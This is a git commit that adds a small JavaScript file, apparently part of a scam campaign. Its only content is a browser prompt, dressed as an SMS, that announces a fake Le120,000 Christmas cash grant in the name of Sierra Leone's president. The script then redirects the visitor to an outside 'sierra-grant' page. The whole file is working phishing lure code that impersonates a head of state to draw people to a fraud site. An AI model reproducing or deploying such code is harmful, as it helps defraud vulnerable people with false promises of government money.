1221ed3293349a9dc35cce4ec91c60de9a34977f
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-19 22:16:17 -0800

    Create sierra-active.js

---
+++ sierra-active.js
@@ -0,0 +1,7 @@
+
+
+var password = 'WITHDRAW Le120,000'
+password=prompt('SMS: Congratulations You are qualify for President JULIUS MAADA BIO Le120,000 CHRISTMAS CASH GRANT FOR SIERRA LEONEANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW Le120,000');
+if (password != 'WITHDRAW Le120,000') {
+location.href='https://xmas-gift.org/sierra-grant.html';
+}
